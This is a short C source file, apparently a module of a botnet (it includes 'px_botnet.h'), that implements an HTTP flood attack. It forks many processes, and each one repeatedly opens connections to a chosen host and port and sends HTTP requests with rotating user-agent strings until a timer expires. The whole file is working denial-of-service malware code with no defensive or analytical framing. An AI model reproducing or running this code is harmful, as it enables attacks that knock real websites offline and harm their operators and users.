#include "../../includes/px_botnet.h"

extern const char *useragents[];

void HTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power)
{
	int error = 0, socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512 + strlen(path)], buffer[1];

	for (i = 0; i < power; i++)
	{
		if (fork())
		{
			sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: Keep-Alive\r\n\r\n", method, path, host, useragents[(rand() % 36)]);
			while (end > time(NULL))
			{
				socket = socket_connect(host, port);
				if (socket != 0)
				{
					i = 0;
					while (i++ < power * 2 && error != -1)
						error = write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}
